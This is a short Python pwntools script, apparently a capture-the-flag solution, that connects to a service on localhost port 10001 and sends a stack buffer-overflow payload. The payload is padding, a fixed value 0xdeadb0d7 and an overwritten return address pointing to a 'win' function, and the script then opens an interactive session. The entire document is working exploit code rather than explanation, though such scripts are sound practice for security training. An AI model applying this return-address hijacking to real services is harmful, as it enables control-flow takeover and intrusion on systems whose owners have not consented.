from pwn import *


p=remote("localhost",10001)

win=0x4013d0
p.sendline(b"a"*0x18+p64(0xdeadb0d7)+p64(0)+p64(win))  # win+77 & 0xff gets the first byte of the adress we want to jump to 


p.interactive()